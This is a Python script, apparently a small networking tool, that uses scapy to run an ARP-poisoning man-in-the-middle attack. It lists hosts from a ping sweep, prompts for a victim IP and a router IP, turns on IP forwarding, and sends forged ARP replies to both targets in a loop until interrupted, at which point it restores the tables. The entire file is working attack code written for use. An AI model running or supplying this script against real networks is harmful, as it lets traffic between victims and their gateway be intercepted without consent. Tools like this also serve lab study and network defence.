# Copyright (c) 2019 Samuel Caraballo Vazquez
#  
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#  
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#  
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
 

from scapy.all import *
import sys
import os
import time
import PingSweeper

targetAddressesIndex = {}
i = 1
for ip, mac in PingSweeper.targetAddresses.items():
		targetAddressesIndex.update({i:{ip:mac}})
		i = i+ 1


print
for index_id, index_ip in targetAddressesIndex.items():
	for item in index_ip:
		if item == PingSweeper.gateway:
			print(str(index_id) + ") " + "IP Address: " + str(item) + " -- This is your Gateway")
		else:
			print(str(index_id) + ") " + "IP Address: " + str(item))
		for mac in index_ip:
			print("     MAC Address: " + str(index_ip[mac]))
			print



try:
	interface = raw_input("[*] Enter Desired Interface: ")
	victimIP = raw_input("[*] Enter Victim IP: ")
	gateIP = raw_input("[*] Enter Router IP: ")
except KeyboardInterrupt:
	print "\n[*] User Requested Shutdown"
	print "[*] Exiting..."
	sys.exit(1)


print "\n[*] Enabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
	conf.verb = 0
	ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
	for snd,rcv in ans:
		return rcv.sprintf(r"%Ether.src%")

def reARP():
	
	print "\n[*] Restoring Targets..."
	victimMAC = get_mac(victimIP)
	gateMAC = get_mac(gateIP)
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
	print "[*] Disabling IP Forwarding..."
	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	print "[*] Shutting Down..."
	sys.exit(1)

def trick(gm, vm):
	send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
	send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

def mitm():
	try:
		victimMAC = get_mac(victimIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
		print "[!] Couldn't Find Victim MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	try:
		gateMAC = get_mac(gateIP)
	except Exception:
		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")		
		print "[!] Couldn't Find Gateway MAC Address"
		print "[!] Exiting..."
		sys.exit(1)
	print "[*] Poisoning Targets..."	
	while 1:
		try:
			trick(gateMAC, victimMAC)
			time.sleep(1.5)
		except KeyboardInterrupt:
			reARP()
			break
mitm()
